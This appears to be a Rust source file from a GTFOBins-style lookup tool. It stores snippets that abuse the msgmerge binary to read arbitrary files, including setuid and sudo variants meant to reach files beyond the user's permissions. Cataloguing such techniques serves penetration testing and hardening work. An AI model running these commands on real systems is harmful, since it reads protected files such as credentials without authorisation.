pub static BIN_NAME: &'static str = "msgmerge";
pub static BIN_DESC: &'static str = "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    msgmerge -P $LFILE /dev/null
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which msgmerge) .

    LFILE=file_to_read
    ./msgmerge -P $LFILE /dev/null
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo msgmerge -P $LFILE /dev/null
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
